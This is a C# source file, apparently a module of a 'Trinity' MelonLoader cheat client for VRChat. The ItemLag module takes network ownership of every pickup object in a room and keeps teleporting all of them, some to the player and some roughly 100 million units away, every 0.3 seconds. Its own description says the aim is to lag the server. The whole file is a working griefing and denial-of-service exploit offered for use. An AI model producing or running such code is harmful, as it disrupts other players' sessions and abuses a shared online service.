using Trinity.Utilities;
using Trinity.SDK;
using MelonLoader;
using System.Collections; 
using UnityEngine;
using VRC.SDKBase;

namespace Trinity.Module.Exploit.Photon_Exploit
{
    internal class ItemLag : BaseModule
    {
        public ItemLag() : base("Item Lag", "Lags Server Via Spamming Items Location, Owner, ", Main.Instance.Eventexploitbutton, null, true, false) { }

        public override void OnEnable()
        {
            MenuUI.Log("EXPLOITS: <color=green>Starting Item Lagger</color>");
            MelonCoroutines.Start(ItemLagger());
            MelonCoroutines.Start(ItemLagger2());
        }

        public override void OnDisable()
        {
            MenuUI.Log("EXPLOITS: <color=red>Stopping Item Lagger</color>");
            MelonCoroutines.Stop(ItemLagger());
            MelonCoroutines.Stop(ItemLagger2());
        }


        public IEnumerator ItemLagger()
        {
            while (this.toggled)
            {
                foreach (VRC.SDKBase.VRC_Pickup VRCPickup in UnityEngine.Object.FindObjectsOfType<VRC.SDKBase.VRC_Pickup>())
                {
                    Networking.LocalPlayer.TakeOwnership(VRCPickup.gameObject);
                    VRCPickup.transform.position = PU.GetPlayer().transform.position + new Vector3(0f, 0.15f, 0f);
                }
                if (!this.toggled)
                    break;
                yield return new WaitForSeconds(0.3f);
            }
            yield break;

             
        }

        public IEnumerator ItemLagger2()
        {
            while (this.toggled)
            {
                foreach (VRC.SDKBase.VRC_Pickup VRCPickup in UnityEngine.Object.FindObjectsOfType<VRC.SDKBase.VRC_Pickup>())
                {
                    Networking.LocalPlayer.TakeOwnership(VRCPickup.gameObject);
                    VRCPickup.transform.position = PU.GetPlayer().transform.position + new Vector3(0f, 9.998E+07f, 0);
                }
                yield return new WaitForSeconds(0.3f);
            }
            yield break;
        }
    }
}
